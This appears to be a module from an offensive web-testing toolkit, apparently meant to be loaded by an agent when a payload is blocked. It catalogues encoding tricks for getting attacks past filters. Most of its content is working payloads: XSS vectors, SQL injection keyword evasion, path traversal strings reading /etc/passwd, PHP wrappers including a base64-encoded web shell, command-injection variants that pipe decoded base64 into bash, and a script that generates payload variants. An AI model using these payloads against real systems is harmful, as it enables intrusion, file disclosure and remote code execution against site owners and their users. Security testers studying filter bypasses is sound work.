# BYPASS MODULE — Encoding & Decoding Chains
# Layer: shared/bypass — applies to ALL asset types and vuln classes
# Load when a payload is being blocked and you suspect encoding-based filtering

## THEORY

Filters often decode input once before checking, but the application
decodes it multiple times before using it. The gap between decode-layers
is the bypass surface.

Rule: always test the FULL decode chain of the target stack, not just one layer.
Common stacks and their layers:
  Browser → URL decode → WAF → URL decode → App framework → HTML decode → Sink
  Browser → JSON parse → WAF → JSON parse → App → eval
  NGINX → URL decode → PHP → base64_decode → eval

---

## 1. URL ENCODING

### Standard single encoding
```
< → %3C       > → %3E       " → %22       ' → %27
( → %28       ) → %29       ; → %3B       / → %2F
\ → %5C       & → %26       = → %3D       + → %2B (space in query)
space → %20 (path) or + (query)
```

### Double encoding — bypass WAFs that decode once
```
< → %253C   (% → %25, then 3C)
> → %253E
" → %2522
' → %2527
( → %2528
/ → %252F
```

### Triple encoding — rare but seen in nested proxy setups
```
< → %25253C
```

### IIS-specific — Unicode wide-char encoding (legacy IIS path traversal)
```
/ → %c0%af    \ → %c1%9c
../  → ..%c0%af   ..\ → ..%c1%1c
```

### Overlong UTF-8 sequences (parser confusion)
```
< → %C0%BC   (invalid UTF-8, some parsers accept)
/ → %C0%AF
```

### Mixed encoding — partial encoding to confuse tokenizers
```
<script>  →  %3Cscript>          (only < encoded)
<script>  →  <scr%69pt>          (only i encoded)
<script>  →  <scr\x69pt>         (hex escape mid-tag)
```

---

## 2. HTML ENCODING

### Named entities
```
< → &lt;         > → &gt;        " → &quot;
' → &apos;       & → &amp;       / → &#x2F;
```

### Decimal numeric entities
```
< → &#60;    > → &#62;    " → &#34;    ' → &#39;    ( → &#40;    ) → &#41;
```

### Hex numeric entities
```
< → &#x3C;   > → &#x3E;   " → &#x22;   ' → &#x27;   ( → &#x28;
```

### Without trailing semicolon (accepted by many parsers)
```
< → &#60    > → &#62    " → &#34
```

### Overlong decimal/hex (padded with zeros)
```
< → &#0060;   < → &#x003C;   < → &#00060;
```

### Context-specific HTML bypass — attribute values without quotes
```html
<img src=x onerror=alert(1)>        <!-- no quotes needed -->
<img src=x onerror=&#97;lert(1)>    <!-- partial encoding in attr -->
<svg onload=&#97;lert&#40;1&#41;>   <!-- full entity encoding -->
```

---

## 3. JAVASCRIPT ENCODING

### String escape sequences
```javascript
\x3C  = <     \x3E  = >     \x22  = "     \x27  = '
\x28  = (     \x29  = )     \x2F  = /     \x5C  = \
```

### Unicode escapes
```javascript
\u003C = <    \u003E = >    \u0022 = "    \u0027 = '
\u0028 = (    \u0029 = )    \u002F = /
```

### Unicode escapes in identifiers (bypass keyword filters)
```javascript
\u0061lert(1)          // alert — \u escape in identifier
\u0061\u006C\u0065\u0072\u0074(1)  // full alert in unicode
al\u0065rt(1)          // mixed
```

### Template literals (bypass quote filters)
```javascript
`alert(1)`             // backtick — bypasses ' and " filters
alert`1`               // tagged template, no parens
```

### Octal (deprecated but accepted in non-strict mode)
```javascript
'\74script\76'   // <script>
```

### String constructor + fromCharCode
```javascript
String.fromCharCode(60,115,99,114,105,112,116,62)   // <script>
eval(String.fromCharCode(97,108,101,114,116,40,49,41))  // alert(1)
```

### atob (base64 decode)
```javascript
eval(atob('YWxlcnQoMSk='))   // alert(1) in base64
```

---

## 4. BASE64 & BINARY ENCODINGS

```bash
# Standard base64
echo -n 'alert(1)' | base64          # YWxlcnQoMSk=
echo -n '<script>' | base64          # PHNjcmlwdD4=

# URL-safe base64 (replace + with - and / with _)
echo -n 'alert(1)' | base64 | tr '+/' '-_'

# Hex encoding
echo -n 'alert(1)' | xxd -p          # 616c65727428312
echo -n '<script>' | xxd -p          # 3c736372697074

# Reverse (sometimes used in obfuscated payloads)
echo -n 'alert(1)' | rev             # )1(trela
```

---

## 5. SQL ENCODING BYPASSES

### Hex string literals (bypass quote filters)
```sql
SELECT 0x61646d696e          -- 'admin' in hex
WHERE username = 0x61646d696e
UNION SELECT 0x3c7363726970743e  -- '<script>' in hex
```

### CHAR() function (MySQL/MSSQL)
```sql
CHAR(97,100,109,105,110)     -- 'admin'
SELECT CHAR(60,115,99,114,105,112,116,62)  -- '<script>'
```

### URL encoding in SQL context (when input passes through URL decode)
```sql
' OR 1=1--   →  %27%20OR%201%3D1--
```

### Unicode normalization (case-insensitive collation bypass)
```sql
-- MySQL with utf8_general_ci:
ß = ss (normalization)
SELECT * FROM users WHERE username = 'ßdmin'  -- may match 'ssdmin'
```

### Comment injection to break keyword detection
```sql
UN/**/ION SEL/**/ECT    -- MySQL inline comments
UN%0BION SEL%0BECT      -- vertical tab whitespace
UN%09ION SEL%09ECT      -- tab whitespace
SE\LECT                  -- MySQL backslash ignored
```

---

## 6. PATH TRAVERSAL ENCODING

```bash
# Standard
../../../etc/passwd

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd   # double encoded

# Windows UNC / backslash
..\..\..\windows\win.ini
..%5C..%5C..%5Cwindows%5Cwin.ini
..%255C..%255C..%255Cwindows%255Cwin.ini

# Null byte (terminates string in C-backed parsers)
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.png

# Unicode alternative separators
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd   # overlong /
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd  # fullwidth /  ／

# Dot variants
..././     (. between dots, normalized to ../)
....//     (four dots, normalized to ../ on some systems)
%2e%2e/    (encoded dots)
%2e%2e%2f  (encoded dots and slash)

# PHP wrappers (when include() is the sink)
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
```

---

## 7. COMMAND INJECTION ENCODING

```bash
# Whitespace alternatives (when space is filtered)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat<>/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
X=$'\x20'&&cat${X}/etc/passwd

# Quotes to break tokenization
c'at' /etc/passwd
c"at" /etc/passwd
ca\t /etc/passwd

# Variable substitution to hide keywords
/bin/c${a}t /etc/passwd           # $a is empty
/???/c?t /etc/passwd              # glob expansion: /bin/cat
/???/??t /etc/passwd

# Hex / octal in bash
$(printf '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')   # /etc/passwd
$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# Base64 command execution
echo YWxlcnQoMSk= | base64 -d | bash
bash<<<$(base64 -d<<<aWQ=)    # id in base64

# Newline injection (%0a) — when single-line validation exists
cmd%0aid
cmd%0a/bin/sh
```

---

## ENCODING CHAIN TESTER

When you find a reflection point, test these systematically:

```python
#!/usr/bin/env python3
"""
encoding_tester.py — generate encoding variants for a payload
Usage: python3 encoding_tester.py '<script>alert(1)</script>'
"""
import urllib.parse, html, base64, sys

payload = sys.argv[1] if len(sys.argv) > 1 else '<script>alert(1)</script>'

variants = {
    "raw":           payload,
    "url_single":    urllib.parse.quote(payload),
    "url_double":    urllib.parse.quote(urllib.parse.quote(payload)),
    "url_triple":    urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload))),
    "html_entities": html.escape(payload),
    "html_decimal":  ''.join(f'&#{ord(c)};' for c in payload),
    "html_hex":      ''.join(f'&#x{ord(c):X};' for c in payload),
    "base64":        base64.b64encode(payload.encode()).decode(),
    "hex":           payload.encode().hex(),
    "js_unicode":    ''.join(f'\\u{ord(c):04X}' for c in payload),
    "js_hex":        ''.join(f'\\x{ord(c):02X}' for c in payload),
    "url_html":      html.escape(urllib.parse.quote(payload)),
    "html_url":      urllib.parse.quote(html.escape(payload)),
}

for name, variant in variants.items():
    print(f"[{name:15}] {variant}")
```
